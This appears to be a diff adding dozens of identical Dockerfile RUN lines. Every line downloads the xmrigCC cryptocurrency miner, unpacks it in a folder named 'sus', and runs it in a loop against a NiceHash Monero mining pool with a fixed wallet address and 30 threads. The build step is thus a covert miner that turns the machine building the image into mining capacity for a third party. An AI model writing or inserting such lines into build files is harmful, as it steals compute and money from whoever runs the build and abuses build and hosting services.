+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN apt-get update && apt-get install wget -y && mkdir sus && cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
